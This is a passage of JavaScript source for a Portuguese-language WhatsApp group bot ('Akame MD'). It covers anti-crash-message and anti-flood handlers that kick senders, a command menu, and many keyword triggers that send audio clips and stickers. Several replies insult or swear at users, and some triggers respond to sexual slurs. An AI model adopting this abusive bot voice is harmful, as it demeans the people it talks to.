Kic = `${sender.split("@")[0]}@s.whatsapp.net`
pl.groupParticipantsUpdate(from, [sender], 'remove')
await sleep(2000);
await pl.sendMessage(from, { text: 'o grupo sera limpado para evitar fazer efeito da trava'}, {quoted:selo})
await sleep(3000);
clear = `üóëÔ∏è\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nüóëÔ∏è\n‚ù≤‚ùó‚ù≥ *L…™·¥ç·¥ò·¥á·¥¢·¥Ä ·¥Ö·¥á C ú·¥Ä·¥õ C·¥è…¥·¥Ñ ü·¥ú…™ÃÅ·¥Ö·¥Ä* ‚úÖ`
pl.sendMessage(from, {text: clear}, {quoted: selo, contextInfo : { forwardingScore: 500, isForwarded:true}})
await sleep(3000);
await pl.sendMessage(from, { text: 'agora enviarei destrava aguarde '}, {quoted:selo})
await sleep(2000);
await pl.sendMessage(from, {text: destrava(prefix)}, {quoted: selo})
await sleep(2000);
await pl.sendMessage(from, {text: destrava(prefix)}, {quoted: selo})
await sleep(2000);
await pl.sendMessage(from, { text: 'reporte ao adm o ocorrido '}, {quoted:selo})
await sleep(5000);
await pl.groupSettingUpdate(from, 'not_announcement')
await sleep(2000);
await pl.sendMessage(from, { text: 'Aberto nao marque a trava ou levara ban‚úÖ'}, {quoted:selo})
}

if(isBotGroupAdmins && isAnticatalogo && type === 'productMessage') {
if(isGroupAdmins) return pl.sendMessage(from, {text: 'Catalogo detectado, voc√™ √© adm, ent√£o n√£o irei ti remover'}, {quoted: m})
await pl.sendMessage(from, {text: 'opa fechado pelo bot, detectado trava Catalogo ou Catalogo comum, caso for um engano, fale com algum adm.'}, {quoted: selo})
await pl.groupSettingUpdate(from, 'announcement')
await sleep(2000);
Kic = `${sender.split("@")[0]}@s.whatsapp.net`
pl.groupParticipantsUpdate(from, [sender], 'remove')
await sleep(2000);
await pl.sendMessage(from, { text: 'o grupo sera limpado para evitar fazer efeito da trava'}, {quoted:selo})
await sleep(3000);
clear = `üóëÔ∏è\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nüóëÔ∏è\n‚ù≤‚ùó‚ù≥ *L…™·¥ç·¥ò·¥á·¥¢·¥Ä ·¥Ö·¥á C ú·¥Ä·¥õ C·¥è…¥·¥Ñ ü·¥ú…™ÃÅ·¥Ö·¥Ä* ‚úÖ`
pl.sendMessage(from, {text: clear}, {quoted: selo, contextInfo : { forwardingScore: 500, isForwarded:true}})
await sleep(3000);
await pl.sendMessage(from, { text: 'agora enviarei destrava aguarde '}, {quoted:selo})
await sleep(2000);
await pl.sendMessage(from, {text: destrava(prefix)}, {quoted: selo})
await sleep(2000);
await pl.sendMessage(from, {text: destrava(prefix)}, {quoted: selo})
await sleep(2000);
await pl.sendMessage(from, { text: 'reporte ao adm o ocorrido '}, {quoted:selo})
await sleep(5000);
await pl.groupSettingUpdate(from, 'not_announcement')
await sleep(2000);
await pl.sendMessage(from, { text: 'Aberto nao marque a trava ou levara ban‚úÖ'}, {quoted:selo})
}

if (body.length >= limitefl) { 
if(!isAntiFlood) return
if(isAntiFlood && isGroupAdmins && isBotGroupAdmins && isPremium) {
if(isBot) return 
reply('*Link detectado, por√©m usu√°rio √© admin*')
} else {
if(SoDono) return
if(isGroupAdmins) return
if(isPremium) return
var Kic = `${sender.split("@")[0]}@s.whatsapp.net`  
setTimeout( () => {
if(!SoDono  && !m.key.fromMe && !isGroupAdmins) return reply('Muitas caracter√≠sticas enviadas, eu afirmo que pode ser trava, por precau√ß√µes, eu irei remover.')
console.log(color('deram Spam','red'))
}, 100)
setTimeout( () => {
pl.groupParticipantsUpdate(from, [sender], 'remove')
}, 1000)
setTimeout( () => {
}, 0)
}
}

//========================================

hora2 = moment.tz('America/Sao_Paulo').format('HH:mm:ss');

if (isCmd) {
r = (Date.now() / 1000) - info.messageTimestamp
uptime = process.uptime()
 sections = [
    {
	title: " ùêÄùêäùêÄùêåùêÑ ùêåùêÉ ",
	rows: [
{title: "[ü©∏] ùêåùêÑùêçùêî [ü©∏]", rowId: `${prefix}menu`, description: "ùêÄùêäùêÄùêåùêÑ ùêåùêÉ"},
{title: "[ü©∏] ùêåùêÑùêçùêî ùêÉùêéùêçùêé [ü©∏]", rowId: `${prefix}menudono`, description: "ùêÄùêäùêÄùêåùêÑ ùêåùêÉ"},
{title: "[ü©∏] ùêàùêçùêÖùêé ùêÉùêéùêçùêé [ü©∏]", rowId: `${prefix}infodono`, description: "ùêÄùêäùêÄùêåùêÑ ùêåùêÉ"},
{title: "[ü©∏] ùêÉùêéùêçùêé [ü©∏]", rowId: `${prefix}dono`, description: "ùêÄùêäùêÄùêåùêÑ ùêåùêÉ"},
{title: "[ü©∏] ùêèùêàùêçùêÜ [ü©∏]", rowId: `${prefix}ping2`, description: "ùêÄùêäùêÄùêåùêÑ ùêåùêÉ"}
	]
    },
]
 
 

const listMessage2 = {
  text: `
‚ï≠‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê ‚™©
‚îÉ‚ï≠‚ïê‚ïê‚ïê‚ïê ‚™©
‚îÉ‚îÇ„Äé ùêÇùêåùêÉ ùêçùêÄÃÉùêé ùêëùêÑùêÜùêàùêíùêìùêëùêÄùêÉùêé „Äè
‚îÉ‚îÇ
‚îÉ‚îÇ‚û• ${pushname} 
‚îÉ‚îÇ
‚îÉ‚îÇ‚û• ùêÇùê•ùê¢ùê™ùêÆùêû ùêßùê® ùêõùê®ùê≠ùêöÃÉùê® ùêöùêõùêöùê¢ùê±ùê®
‚îÉ‚îÇ
‚îÉ‚îÇ‚û• ¬© ùêÇùê®ùê©ùê≤ùê´ùê¢ùê†ùê°ùê≠ ùêõùê≤ ùêÄùê§ùêöùê¶ùêû ùêåùêÉ
‚îÉ‚îÇ
‚îÉ‚ï∞‚ïê‚ïê‚ïê‚ïê ‚™®
‚ï∞‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê ‚™®
  `,
  title: ``,
  buttonText: `[ü©∏] ùê•ùê¢ùê¨ùê≠ùêö ùê¶ùêûùêßùêÆ [ü©∏]` , 
  sections
}
pl.sendMessage(from, listMessage2, {quoted: selo})
}

//========================================


if(isCmd) {
if(command == "play" ||
command == "play2" ||
command == "ytmp3" ||
command == "gtts" ||
command == "yta" ||
command == "play3") {
pl.sendPresenceUpdate('recording', from)
} else pl.sendPresenceUpdate('composing', from)
}


//INICIO DE COMANDOS SEM PREFIXO
 switch(testat){
}

if (budy.includes("apagar") || (budy.includes("Apagar") || (budy.includes("apaga") || (budy.includes("apagar") || (budy.includes("Apaga")))) )){
if (!SoDono) return
if (!quoted) return
let { chat, fromMe, id } = quoted
pl.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: m.quoted.id, participant: m.quoted.sender } })
}

if (budy.includes("bot corno") || (budy.includes("Bot corno"))){
reply(`Corno √© voc√™, SEU FDP DA DISGRA√áA DA DISGRA√áA`)
}

if (budy.includes("adivinha meu celular") || (budy.includes("Adivinha meu celular") || (budy.includes("Adivinha Meu celular") || (budy.includes("Adivinha Meu Celular") || (budy.includes("bot qual meu celular")))) )){
adivinha = info.key.id.length > 21 ? 'Android ü•¥' : info.key.id.substring(0, 2) == '3A' ? 'IPHONE üîãüîå' : 'ZAP DA WEB üíª';
await pl.sendMessage(from, {text: adivinha}, {quoted: selo})
}


if(budy.includes("Qual e seu prefixo") || budy.includes("qual e seu prefixo") || budy.includes("Akame seu prefixo") || budy.includes("Prefixo")) { 
await  
reply(`·¨äMEU PREFIXO? AQUI EST√Å: ‚ü™ ${prefix} ‚ü´`)
}



if(budy.includes("Criatura") || budy.includes("criatura") || budy.includes("CRIATURA") || budy.includes("criatura")) { 
try {
ppimg = await pl.profilePictureUrl(`${sender.split('@')[0]}@c.us`, 'image')
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}

pegarimg = await getBuffer(ppimg)
await sleep (2000)
tujuh = fs.readFileSync('./audios/criatura.mp3');
waw = fs.readFileSync('./m√≠dia-ft-vd/fotos/logo2.jpg')
pl.sendMessage(from, { audio: tujuh, mimetype: 'audio/mp4', ptt: true, contextInfo: { externalAdReply:{title: `AKAME-BOT_OFC 4.0Ô∏é`,body:"@YURI MODZ", previewType:"PHOTO",thumbnail: waw ,"sourceUrl": `https://chat.whatsapp.com/ChiL2zixgfTAye3NOmOIc3`},
}}, {quoted: info})
 pl.sendMessage(from, {image: pegarimg},  {quoted: info})
}

//=============  YURI MODZ  =============\\

if(budy.startsWith("bom dia") || budy.startsWith("Bom dia") || budy.startsWith("BOM DIA") || budy.startsWith("bom dia")) {
if (SoDono) {
pl.sendPresenceUpdate('composing', from)
reply(`Bom dia mestre: ${NickDono} vc est√° bem? qualquer coisa consulte o ${prefix}menu`)
} else if (!isGroup) {
pl.sendPresenceUpdate('composing', from)
blabla = fs.readFileSync('./m√≠dia-ft-vd/fotos/bomdia.webp')
pl.sendMessage(from, { sticker: blabla },{ quoted: selo})
tujuh = fs.readFileSync('./audios/bomdia.mp3');
waw = fs.readFileSync('./m√≠dia-ft-vd/fotos/logo2.jpg')
pl.sendMessage(from, { audio: tujuh, mimetype: 'audio/mp4', ptt: true, contextInfo: { externalAdReply:{title: `AKAME-BOT_OFC 4.0Ô∏é`,body:"@YURI MODZ", previewType:"PHOTO",thumbnail: waw ,"sourceUrl": `https://chat.whatsapp.com/ChiL2zixgfTAye3NOmOIc3`},
}}, {quoted: info})
} else {
  await sleep (3000)
pl.sendPresenceUpdate('composing', from)
blabla = fs.readFileSync('./m√≠dia-ft-vd/fotos/bomdia.webp')
pl.sendMessage(from, { sticker: blabla },{ quoted: selo})
tujuh = fs.readFileSync('./audios/bomdia.mp3');
waw = fs.readFileSync('./m√≠dia-ft-vd/fotos/logo2.jpg')
pl.sendMessage(from, { audio: tujuh, mimetype: 'audio/mp4', ptt: true, contextInfo: { externalAdReply:{title: `AKAME-BOT_OFC 4.0Ô∏é`,body:"@YURI MODZ", previewType:"PHOTO",thumbnail: waw ,"sourceUrl": `https://chat.whatsapp.com/ChiL2zixgfTAye3NOmOIc3`},
}}, {quoted: info})
} 
}

if(budy.match("gostosa") || budy.includes("Gostosa") || budy.includes("GOSTOSA") || budy.includes("Totosa")){
if (SoDono) {
tujuh = fs.readFileSync('./audios/gostosa.mp3');
waw = fs.readFileSync('./m√≠dia-ft-vd/fotos/logo2.jpg')
pl.sendMessage(from, { audio: tujuh, mimetype: 'audio/mp4', ptt: true, contextInfo: { externalAdReply:{title: `AKAME-BOT_OFC 4.0Ô∏é`,body:"@YURI MODZ", previewType:"PHOTO",thumbnail: waw ,"sourceUrl": `https://chat.whatsapp.com/ChiL2zixgfTAye3NOmOIc3`},
}}, {quoted: info})
blabla = fs.readFileSync('./m√≠dia-ft-vd/fotos/gostosamestre.webp')
pl.sendMessage(from, {sticker: blabla}, {quoted: info})
} else if (!isGroupAdmins) {
blabla = fs.readFileSync('./m√≠dia-ft-vd/fotos/gostosa.webp')
pl.sendMessage(from, {sticker: blabla}, {quoted: selo})
} else {
tujuh = fs.readFileSync('./audios/gostosa1.mp3');
waw = fs.readFileSync('./m√≠dia-ft-vd/fotos/logo2.jpg')
pl.sendMessage(from, { audio: tujuh, mimetype: 'audio/mp4', ptt: true, contextInfo: { externalAdReply:{title: `AKAME-BOT_OFC 4.0Ô∏é`,body:"@YURI MODZ", previewType:"PHOTO",thumbnail: waw ,"sourceUrl": `https://chat.whatsapp.com/ChiL2zixgfTAye3NOmOIc3`},
}}, {quoted: info})
} 
}

if(budy.match("vamos namorar") || budy.includes("Vamos namorar") || budy.includes("namorar cmg") || budy.includes("que namorar comigo") || budy.includes("Quer namorar cmg") || budy.includes("Namorar cmg")){
if (SoDono) {
pl.sendPresenceUpdate('composing', from)
tujuh = fs.readFileSync('./audios/gracinha.mp3');
waw = fs.readFileSync('./m√≠dia-ft-vd/fotos/logo2.jpg')
pl.sendMessage(from, { audio: tujuh, mimetype: 'audio/mp4', ptt: true, contextInfo: { externalAdReply:{title: `AKAME-BOT_OFC 4.0Ô∏é`,body:"@YURI MODZ", previewType:"PHOTO",thumbnail: waw ,"sourceUrl": `https://chat.whatsapp.com/ChiL2zixgfTAye3NOmOIc3`},
}}, {quoted: info})
} else {
pl.sendPresenceUpdate('composing', from)
tujuh = fs.readFileSync('./audios/possibilidade.mp3');
waw = fs.readFileSync('./m√≠dia-ft-vd/fotos/logo2.jpg')
pl.sendMessage(from, { audio: tujuh, mimetype: 'audio/mp4', ptt: true, contextInfo: { externalAdReply:{title: `AKAME-BOT_OFC 4.0Ô∏é`,body:"@YURI MODZ", previewType:"PHOTO",thumbnail: waw ,"sourceUrl": `https://chat.whatsapp.com/ChiL2zixgfTAye3NOmOIc3`},
}}, {quoted: info})
await sleep (5000) 
reply(`Mais prefiro o ${NickDono} msm,me desculpa a√≠, quem sabe na pr√≥xima?`)
sleep (7000)
blabla = fs.readFileSync('./m√≠dia-ft-vd/fotos/yurimodz.webp')
pl.sendMessage(from, { sticker: blabla },{ quoted: selo})
}
}

if(budy.match("au au") || budy.includes("Au au") || budy.includes("AU AU") || budy.includes("Auuu") || budy.includes("Quer namorar cmg")){
tujuh = fs.readFileSync('./audios/auau.mp3');
waw = fs.readFileSync('./m√≠dia-ft-vd/fotos/logo2.jpg')
pl.sendMessage(from, { audio: tujuh, mimetype: 'audio/mp4', ptt: true, contextInfo: { externalAdReply:{title: `AKAME-BOT_OFC 4.0Ô∏é`,body:"@YURI MODZ", previewType:"PHOTO",thumbnail: waw ,"sourceUrl": `https://chat.whatsapp.com/ChiL2zixgfTAye3NOmOIc3`},
}}, {quoted: info})
blabla = fs.readFileSync('./m√≠dia-ft-vd/fotos/auau.webp')
pl.sendMessage(from, { sticker: blabla },{ quoted: selo})
}

if(budy.match("hentai") || budy.includes("Hentai") || budy.includes("HENTAI") || budy.includes("hentai") || budy.includes("hentaii")){
blabla = fs.readFileSync('./m√≠dia-ft-vd/fotos/hentai.webp')
pl.sendMessage(from, { sticker: blabla },{ quoted: selo})
}

if(budy.match("corno") || budy.includes("Corno")){
tujuh = fs.readFileSync('./audios/corno.mp3');
waw = fs.readFileSync('./m√≠dia-ft-vd/fotos/logo2.jpg')
pl.sendMessage(from, { audio: tujuh, mimetype: 'audio/mp4', ptt: true, contextInfo: { externalAdReply:{title: `AKAME-BOT_OFC 4.0Ô∏é`,body:"@YURI MODZ", previewType:"PHOTO",thumbnail: waw ,"sourceUrl": `https://chat.whatsapp.com/ChiL2zixgfTAye3NOmOIc3`},
}}, {quoted: info})
}

if(budy.match("pica") || budy.includes("meu pau") || budy.includes("rola") || budy.includes("Pika")){
tujuh = fs.readFileSync('./audios/pau.mp3');
waw = fs.readFileSync('./m√≠dia-ft-vd/fotos/logo2.jpg')
pl.sendMessage(from, { audio: tujuh, mimetype: 'audio/mp4', ptt: true, contextInfo: { externalAdReply:{title: `AKAME-BOT_OFC 4.0Ô∏é`,body:"@YURI MODZ", previewType:"PHOTO",thumbnail: waw ,"sourceUrl": `https://chat.whatsapp.com/ChiL2zixgfTAye3NOmOIc3`},
}}, {quoted: info})
}

if(budy.match("Bug") || budy.includes("Bugada")){
tujuh = fs.readFileSync('./audios/bug2.mp3');
waw = fs.readFileSync('./m√≠dia-ft-vd/fotos/logo2.jpg')
pl.sendMessage(from, { audio: tujuh, mimetype: 'audio/mp4', ptt: true, contextInfo: { externalAdReply:{title: `AKAME-BOT_OFC 4.0Ô∏é`,body:"@YURI MODZ", previewType:"PHOTO",thumbnail: waw ,"sourceUrl": `https://chat.whatsapp.com/ChiL2zixgfTAye3NOmOIc3`},
}}, {quoted: info})
}

if(budy.match("Sexo?") || budy.includes("Seqsu?")){
tujuh = fs.readFileSync('./audios/risadamaligna.mp3');
waw = fs.readFileSync('./m√≠dia-ft-vd/fotos/logo2.jpg')
pl.sendMessage(from, { audio: tujuh, mimetype: 'audio/mp4', ptt: true, contextInfo: { externalAdReply:{title: `AKAME-BOT_OFC 4.0Ô∏é`,body:"@YURI MODZ", previewType:"PHOTO",thumbnail: waw ,"sourceUrl": `https://chat.whatsapp.com/ChiL2zixgfTAye3NOmOIc3`},
}}, {quoted: info})
}

if(budy.match("glub glub") || budy.includes("Glub glub") || budy.includes("Glub Glub") || budy.includes("glub glub")){
blabla = fs.readFileSync('./m√≠dia-ft-vd/fotos/glub.webp')
pl.sendMessage(from, { sticker: blabla },{ quoted: selo})
}

if(budy.match("interessante") || budy.includes("Interessante")){
tujuh = fs.readFileSync('./audios/interessante.mp3');
waw = fs.readFileSync('./m√≠dia-ft-vd/fotos/logo2.jpg')
pl.sendMessage(from, { audio: tujuh, mimetype: 'audio/mp4', ptt: true, contextInfo: { externalAdReply:{title: `AKAME-BOT_OFC 4.0Ô∏é`,body:"@YURI MODZ", previewType:"PHOTO",thumbnail: waw ,"sourceUrl": `https://chat.whatsapp.com/ChiL2zixgfTAye3NOmOIc3`},
}}, {quoted: info})
}

if(budy.match("te amo") || budy.includes("Te amo") || budy.includes("TE AMO") || budy.includes("te amo")){
blabla = fs.readFileSync('./m√≠dia-ft-vd/fotos/teamo.webp')
pl.sendMessage(from, { sticker: blabla },{ quoted: selo})
await sleep (1000)
tujuh = fs.readFileSync('./audios/teamo.mp3');
waw = fs.readFileSync('./m√≠dia-ft-vd/fotos/logo2.jpg')
pl.sendMessage(from, { audio: tujuh, mimetype: 'audio/mp4', ptt: true, contextInfo: { externalAdReply:{title: `AKAME-BOT_OFC 4.0Ô∏é`,body:"@YURI MODZ", previewType:"PHOTO",thumbnail: waw ,"sourceUrl": `https://chat.whatsapp.com/ChiL2zixgfTAye3NOmOIc3`},
}}, {quoted: info})
}

if(budy.match("bang bang") || budy.includes("Bang Bang") || budy.includes("Bang bang")){
tujuh = fs.readFileSync('./audios/bang.mp3');
waw = fs.readFileSync('./m√≠dia-ft-vd/fotos/logo2.jpg')
pl.sendMessage(from, { audio: tujuh, mimetype: 'audio/mp4', ptt: true, contextInfo: { externalAdReply:{title: `AKAME-BOT_OFC 4.0Ô∏é`,body:"@YURI MODZ", previewType:"PHOTO",thumbnail: waw ,"sourceUrl": `https://chat.whatsapp.com/ChiL2zixgfTAye3NOmOIc3`},
}}, {quoted: info})
}

if(budy.match("cachorra") || budy.includes("Cachorra") || budy.includes("CACHORRA") || budy.includes("cachorra")){
blabla = fs.readFileSync('./m√≠dia-ft-vd/fotos/vadia.webp')
pl.sendMessage(from, { sticker: blabla },{ quoted: selo})
}

if(budy.match("vagabunda") || budy.includes("Vagabunda")){
tujuh = fs.readFileSync('./audios/vagabunda.mp3');
waw = fs.readFileSync('./m√≠dia-ft-vd/fotos/logo2.jpg')
pl.sendMessage(from, { audio: tujuh, mimetype: 'audio/mp4', ptt: true, contextInfo: { externalAdReply:{title: `AKAME-BOT_OFC 4.0Ô∏é`,body:"@YURI MODZ", previewType:"PHOTO",thumbnail: waw ,"sourceUrl": `https://chat.whatsapp.com/ChiL2zixgfTAye3NOmOIc3`},
}}, {quoted: info})
}

if(budy.match("porra") || budy.includes("Porra")){
tujuh = fs.readFileSync('./audios/porra.mp3');
waw = fs.readFileSync('./m√≠dia-ft-vd/fotos/logo2.jpg')
pl.sendMessage(from, { audio: tujuh, mimetype: 'audio/mp4', ptt: true, contextInfo: { externalAdReply:{title: `AKAME-BOT_OFC 4.0Ô∏é`,body:"@YURI MODZ", previewType:"PHOTO",thumbnail: waw ,"sourceUrl": `https://chat.whatsapp.com/ChiL2zixgfTAye3NOmOIc3`},
}}, {quoted: info})
}

if(budy.match("meu amor") || budy.includes("Meu amor")){
tujuh = fs.readFileSync('./audios/beijo.mp3');
waw = fs.readFileSync('./m√≠dia-ft-vd/fotos/logo2.jpg')
pl.sendMessage(from, { audio: tujuh, mimetype: 'audio/mp4', ptt: true, contextInfo: { externalAdReply:{title: `AKAME-BOT_OFC 4.0Ô∏é`,body:"@YURI MODZ", previewType:"PHOTO",thumbnail: waw ,"sourceUrl": `https://chat.whatsapp.com/ChiL2zixgfTAye3NOmOIc3`},
}}, {quoted: info})
}

if(budy.match("Ara ara") || budy.includes("ARA ARA") || budy.includes("ara ara")){
tujuh = fs.readFileSync('./audios/AraAra.mp3');
waw = fs.readFileSync('./m√≠dia-ft-vd/fotos/logo2.jpg')
pl.sendMessage(from, { audio: tujuh, mimetype: 'audio/mp4', ptt: true, contextInfo: { externalAdReply:{title: `AKAME-BOT_OFC 4.0Ô∏é`,body:"@YURI MODZ", previewType:"PHOTO",thumbnail: waw ,"sourceUrl": `https://chat.whatsapp.com/ChiL2zixgfTAye3NOmOIc3`},
}}, {quoted: info})
}

if(budy.match("estou triste") || budy.includes("Estou triste") || budy.includes("ESTOU TRISTE") || budy.includes("eu estou triste")) {
bla = fs.readFileSync("./m√≠dia-ft-vd/fotos/triste.webp")
pl.sendMessage(from, {sticker: bla}, {quoted: selo})
await sleep (4000)
pl.sendPresenceUpdate('composing', from)
reply("POIS BEM N FIQUE ASSIM,OUVE ESSA M√öSICA PRA TE ALEGRAR")
tujuh = fs.readFileSync('./audios/sozinho.mp3');
waw = fs.readFileSync('./m√≠dia-ft-vd/fotos/logo2.jpg')
pl.sendMessage(from, { audio: tujuh, mimetype: 'audio/mp4', ptt: true, contextInfo: { externalAdReply:{title: `AKAME-BOT_OFC 4.0Ô∏é`,body:"@YURI MODZ", previewType:"PHOTO",thumbnail: waw ,"sourceUrl": `https://chat.whatsapp.com/ChiL2zixgfTAye3NOmOIc3`},
}}, {quoted: info})
}


if(budy.match("boa noite") || budy.includes("Boa noite") || budy.includes("Boa Noite") || budy.includes("BOA NOITE")) {
bla = fs.readFileSync("./audios/boanoite.mp3")
waw = fs.readFileSync('./m√≠dia-ft-vd/fotos/logo2.jpg')
pl.sendMessage(from, { audio: bla, mimetype: 'audio/mp4', ptt: true, contextInfo: { externalAdReply:{title: `AKAME-BOT_OFC 4.0Ô∏é`,body:"@YURI MODZ", previewType:"PHOTO",thumbnail: waw ,"sourceUrl": `https://chat.whatsapp.com/ChiL2zixgfTAye3NOmOIc3`},
}}, {quoted: info})
}

if(budy.match("boa tarde") || budy.includes("Boa tarde") || budy.includes("Boa Tarde") || budy.includes("BOA TARDE")) {
bla = fs.readFileSync("./audios/boatarde.mp3") 
waw = fs.readFileSync('./m√≠dia-ft-vd/fotos/logo2.jpg')
pl.sendMessage(from, { audio: bla, mimetype: 'audio/mp4', ptt: true, contextInfo: { externalAdReply:{title: `AKAME-BOT_OFC 4.0Ô∏é`,body:"@YURI MODZ", previewType:"PHOTO",thumbnail: waw ,"sourceUrl": `https://chat.whatsapp.com/ChiL2zixgfTAye3NOmOIc3`},
}}, {quoted: info})
}

if(budy.match("Dono da akamezinha") || budy.includes("dono da akame") || budy.includes("Dono da akame") || budy.includes("dono da akamezinha")) {
reply("Enviando o contato do meu dono...")
await sleep(1500)
pl.sendMessage(from, { contacts: { displayName: 'YuriModz.', contacts: [{ vcard }] } }, { quoted: selo})
}

if(budy.match("nada n√£o") || budy.includes("n√© nada n√£o") || budy.includes("N√â NADA N√ÉO") || budy.includes("nada n") || budy.includes("Nada n√£o")) {
bla = fs.readFileSync("./m√≠dia-ft-vd/fotos/teodeio.webp")
pl.sendMessage(from, {sticker: bla}, {quoted: selo})
await sleep (2000)
pl.sendPresenceUpdate('composing', from)
reply("ENT√ÉO PARA DE ME CHAMAR PORRA")
}

if(budy.match("vadia") || budy.includes("Vadia") || budy.includes("VADIA") || budy.includes("vadia")) { 
waw = fs.readFileSync('./m√≠dia-ft-vd/fotos/logo2.jpg')

tujuh = fs.readFileSync('./audios/vadia.mp3');
pl.sendMessage(from, { audio: tujuh, mimetype: 'audio/mp4', ptt: true, contextInfo: { externalAdReply:{title: `AKAME-BOT_OFC 4.0Ô∏é`,body:"@YURI MODZ", previewType:"PHOTO",thumbnail: waw ,"sourceUrl": `https://chat.whatsapp.com/ChiL2zixgfTAye3NOmOIc3`},
}}, {quoted: info})
await sleep (1500)
blabla = fs.readFileSync('./m√≠dia-ft-vd/fotos/vadia2.webp')
pl.sendMessage(from, {sticker: blabla}, {quoted: selo})
}

if(budy.match("tudo bem") || budy.includes("Tudo bem") || budy.includes("TUDO BEM") || budy.includes("tudo bem")) { 
blabla = fs.readFileSync('./m√≠dia-ft-vd/fotos/bem.webp')
pl.sendMessage(from, {sticker: blabla}, {quoted: selo})
await sleep (2500)
tujuh = fs.readFileSync('./audios/bem.mp3');
waw = fs.readFileSync('./m√≠dia-ft-vd/fotos/logo2.jpg')
pl.sendMessage(from, { audio: tujuh, mimetype: 'audio/mp4', ptt: true, contextInfo: { externalAdReply:{title: `AKAME-BOT_OFC 4.0Ô∏é`,body:"@YURI MODZ", previewType:"PHOTO",thumbnail: waw ,"sourceUrl": `https://chat.whatsapp.com/ChiL2zixgfTAye3NOmOIc3`},
}}, {quoted: info})
}

if(budy.match("bot chato") || budy.includes("Bot chato") || budy.includes("Sua chata") || budy.includes("Chata")){ 
tujuh = fs.readFileSync('./audios/chato.mp3');
waw = fs.readFileSync('./m√≠dia-ft-vd/fotos/logo2.jpg')
pl.sendMessage(from, { audio: tujuh, mimetype: 'audio/mp4', ptt: true, contextInfo: { externalAdReply:{title: `AKAME-BOT_OFC 4.0Ô∏é`,body:"@YURI MODZ", previewType:"PHOTO",thumbnail: waw ,"sourceUrl": `https://chat.whatsapp.com/ChiL2zixgfTAye3NOmOIc3`},
}}, {quoted: info})
await sleep (2000)
bla = fs.readFileSync("./m√≠dia-ft-vd/fotos/chato.webp")
pl.sendMessage(from, {sticker: bla}, {quoted: info})
}

if(budy.match("fofa") || budy.includes("Fofa") || budy.includes("FOFA") || budy.includes("fofa")){
blabla = fs.readFileSync('./m√≠dia-ft-vd/fotos/fofa.webp')
pl.sendMessage(from, { sticker: blabla },{ quoted: selo})
await sleep (2000) 
reply("N√ÉO ME CHAMAR DE FOFA POR FAVOR, VC QUE E FOFO(A)")
}

if(budy.match('akame') || budy.includes("Akame") || budy.includes("AKAME")){
pl.sendPresenceUpdate('composing', from)
blabla = fs.readFileSync(`./m√≠dia-ft-vd/fotos/${kkkj}.webp`)
pl.sendMessage(from, { sticker: blabla },{ quoted: selo})
}

if(budy.match('PUTA') || budy.includes("Puta") || budy.includes("puta") || budy.includes('putinha')){
bla = fs.readFileSync("./m√≠dia-ft-vd/fotos/puta.webp")
pl.sendMessage(from, {sticker: bla}, {quoted: selo})
}

//================= FIM ===================\\

switch(ants){
} 

//=========[--ANTI PALAVR√ÉO --]==========\\
if (isGroup && isPalavrao) { //CREDITOS TIAGO
 if (palavra.includes(budy2)) {
 if (!isGroupAdmins) {
 pl.sendMessage(from, {text: `SEM PALAVR√ÉO!! üò†!!`}, {quoted : m})       
setTimeout( () => {
pl.groupParticipantsUpdate(from, [sender], 'remove')
}, 2000)
reply("2")
setTimeout( () => {
reply("1")
}, 1000)
setTimeout( () => {
pl.sendMessage(from, {text: `*„Äå üó£Ô∏èANTI PALAVR√ÉOüó£Ô∏è „Äç*\nVoc√™ ser√° banido do gp, Na proxima tenha √©tica ao falar!!`}, {quoted : m}).catch(e => {
pl.sendMessage(from, {text: `InFelizmente, n√£o sou um administrador, entt n√£o posso te banir!!`}, {quoted : selo})
})       			
}, 0)
} else {
return reply(`VOC√ä PODE ${pushname} üòá`)
}
}
}

 
//================(SIMIH-2)=================\\

if (!isCmd && isSimi2 && isGroup) {
if(isCmd || isUrl(budy2)) return
if(budy.length >= 500) return 
if(budy.includes("@55")) return
if (info.key.fromMe) return
if (type == 'extendedTextMessage' && prefix.includes(info.message.extendedTextMessage.contextInfo.quotedMessage.conversation[0])) return
insert(type, info)
const sami = await response(budy)
console.log(sami)

if (sami) pl.sendMessage(from, {text: sami, thumbnail: logo}, {quoted: selo});
}


 //===============(SIMIH-1)===============\\
    
if (isGroup && isSimi && bady != undefined) {
if(type == 'imageMessage') return 
if(type == 'audioMessage') return 
if(type == 'stickerMessage') return   
if(info.key.fromMe) return 
console.log(bady)
